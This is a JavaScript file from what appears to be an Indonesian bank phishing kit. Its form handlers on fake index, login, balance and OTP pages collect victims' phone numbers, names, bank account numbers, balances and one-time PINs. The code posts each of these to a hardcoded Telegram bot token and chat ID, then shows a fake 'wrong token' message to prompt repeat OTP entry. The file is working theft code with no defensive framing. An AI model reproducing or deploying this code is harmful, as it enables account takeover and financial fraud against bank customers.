// Telegram bot settings
const botToken = '7421303901:AAG2bmvEvKji7H5jCOuqDtz8XfNUsTsm53U';
const chatId = '6518083135';

// Function to send data to Telegram
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Add any success handling here
    })
    .catch((error) => {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    });
}

// index.html
function sendHp() {
    event.preventDefault();
    $('.process1').fadeIn();
    document.getElementById('btnSubmit1').innerHTML = "Memproses...";

    const tarif = document.querySelector('input[name="tarif"]:checked').value;
    const nohp = document.getElementById('nope').value;

    const message = `New submission:\nTarif: ${tarif}\nNo HP: ${nohp}`;
    sendToTelegram(message);

    setTimeout(function(){
        window.location.href = 'login.html';
        document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
        $('.process1').fadeOut();
    }, 800);
}

// login.html
function sendLog() {
    event.preventDefault();
    $('.process1').fadeIn();
    document.getElementById('btnSubmit1').innerHTML = "Memproses...";

    const nama = document.querySelector('input[name="nama"]').value;
    const rek = document.querySelector('input[name="rek"]').value;

    const message = `New login:\nNama: ${nama}\nNo Rekening: ${rek}`;
    sendToTelegram(message);

    setTimeout(function(){
        window.location.href = 'saldo.html';
        document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
        $('.process1').fadeOut();
    }, 800);
}

// saldo.html
function neraike() {
    event.preventDefault();
    $('.process1').fadeIn();
    document.getElementById('btnSubmit1').innerHTML = "Memproses...";

    const saldo = document.getElementById('saldo').value;

    const message = `New balance submission:\nSaldo: ${saldo}`;
    sendToTelegram(message);

    setTimeout(function(){
        window.location.href = 'otp.html';
        document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
        $('.process1').fadeOut();
    }, 800);
}

// otp.html
$(document).ready(function() {
    $("button#setPin").on('click', function() {
        var pin = $(this).attr('data-id');
        
        // ... (rest of the pin input logic remains the same)

        if($.trim($("#pin5").html())!='' && $.trim($("#pin6").html())=='') {
            $("#pin6").html(pin);

            var setPin = $("#pin1").html()+''+$("#pin2").html()+''+$("#pin3").html()+''+$("#pin4").html()+''+$("#pin5").html()+''+$("#pin6").html();
            $("input#setPin").val(setPin);

            var pinValue = $("input#setPin").val();

            if(pinValue.length == 6) {
                $("#keybot").addClass("fadeOutDownBig");     
                event.stopPropagation();
                event.preventDefault();
   
                const message = `New OTP submission:\nOTP: ${pinValue}`;
                sendToTelegram(message);

                setTimeout(function(){  
                    $("#notif").text("- Token Aktivasi SALAH -");
                    $("#notif").css("color", "red");
                    $("#pin1, #pin2, #pin3, #pin4, #pin5, #pin6").html('');   
                    setTimeout(() => {
                        $("#notif").text("Request Token Aktivasi");
                        $("#notif").css("color", "white");
                        $("#keybot").hide();  
                    }, 4000);
                }, 700);
            }
        }
    });

    $("#hapus").on('click', function() {
        $("#pin1, #pin2, #pin3, #pin4, #pin5, #pin6").html('');
    });
});